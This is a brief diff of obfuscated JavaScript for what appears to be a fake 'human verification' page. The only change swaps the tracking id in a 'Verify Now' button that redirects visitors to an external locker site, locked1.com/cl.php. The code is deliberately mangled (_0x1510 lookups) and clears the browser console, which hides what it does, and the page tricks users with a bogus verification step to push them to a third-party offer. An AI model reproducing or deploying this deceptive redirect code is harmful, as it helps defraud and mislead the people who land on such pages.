@@ -330,7 +330,7 @@ $(document)[_0x1510('0x0')](function () {
                                                                     <span id="human_verification_timer_time">few seconds</span>
                                                                 </div>
                                                                 <div class="verification-button-wrapper animated bounceIn animation-delay-1000">
-                                                                    <a id="verification-button" class="tkt-btn animated pulse infinite" onClick="window.location.href='https://www.locked1.com/cl.php?id=f0a21afb30fd4dc26fa58b42526532c7';"><span>Verify Now</span></a>
+                                                                    <a id="verification-button" class="tkt-btn animated pulse infinite" onClick="window.location.href='https://www.locked1.com/cl.php?id=85bdbbd575be8f36060e186aa76d463d';"><span>Verify Now</span></a>
                                                                 </div>
                                                             </div>`;
                                                                     console[_0x1510('0x4b')]();
